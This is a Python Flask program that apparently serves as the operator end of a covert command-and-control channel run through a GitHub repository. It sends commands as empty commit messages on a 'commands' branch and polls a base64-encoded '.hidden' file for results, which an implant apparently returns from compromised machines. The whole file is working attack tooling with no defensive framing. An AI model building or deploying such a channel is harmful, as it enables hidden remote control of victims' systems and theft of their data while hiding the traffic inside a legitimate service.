import os
import time
import base64
import git
from flask import Flask, request, jsonify
from git.exc import GitCommandError

# Config
REPO_DIR = "local clone location"
REPO_URL = "https://github.com/user/reponame.git"
BRANCH = "commands"
COMMIT_MSG_PREFIX = "update-"

# Initialize Flask
app = Flask(__name__)

# Clone the repo if it doesn't exist
def init_repo():
    if not os.path.isdir(REPO_DIR):
        print("[*] Cloning repository...")
        git.Repo.clone_from(REPO_URL, REPO_DIR, branch=BRANCH)
    else:
        print("[*] Repository already exists.")

# Fetch the latest data from the repo
def fetch_repo():
    try:
        repo = git.Repo(REPO_DIR)
        origin = repo.remotes.origin
        origin.fetch()
        print("[*] Fetched latest updates from remote.")
    except GitCommandError as e:
        print(f"Error fetching repo: {e}")

# Commit and push the command to the repo
def push_command_to_repo(command):
    try:
        repo = git.Repo(REPO_DIR)
        repo.git.checkout(BRANCH)
        # Create a new commit with the command as the message
        repo.git.commit('--allow-empty', '-m', command)
        repo.remotes.origin.push()
        print(f"[*] Pushed command to repo: {command}")
    except GitCommandError as e:
        print(f"Error pushing command: {e}")

def pull_results_from_repo():
    try:
        repo = git.Repo(REPO_DIR)
        repo.git.checkout(BRANCH)
        repo.remotes.origin.pull()
        
        # Read the base64-encoded results from the .hidden file
        hidden_file_path = os.path.join(REPO_DIR, ".hidden")
        if os.path.exists(hidden_file_path):
            with open(hidden_file_path, "r") as f:
                encoded_output = f.read().strip()
            decoded_output = base64.b64decode(encoded_output).decode("utf-8")
            print(f"[*] Retrieved result: {decoded_output}")
            return decoded_output
        else:
            return None
    except GitCommandError as e:
        print(f"Error pulling results: {e}")
        return None

# Route to send command
@app.route('/send_command', methods=['POST'])
def send_command():
    command = request.json.get('command', '')
    if not command:
        return jsonify({'error': 'No command provided'}), 400

    print(f"[*] Sending command: {command}")
    push_command_to_repo(command)
    return jsonify({'status': 'Command sent successfully'}), 200

# Route to retrieve the results
@app.route('/get_results', methods=['GET'])
def get_results():
    results = pull_results_from_repo()
    if results:
        return jsonify({'results': results}), 200
    else:
        return jsonify({'message': 'No results available'}), 404

# fetch results and print them to the console
def periodic_pull_results():
    while True:
        results = pull_results_from_repo()
        if results:
            print(f"[{time.ctime()}] Received results: {results}")
        time.sleep(10)

if __name__ == '__main__':
    init_repo()

    # Start periodic result polling in the background
    import threading
    threading.Thread(target=periodic_pull_results, daemon=True).start()

    # Start the Flask server
    app.run(host="0.0.0.0", port=5000)
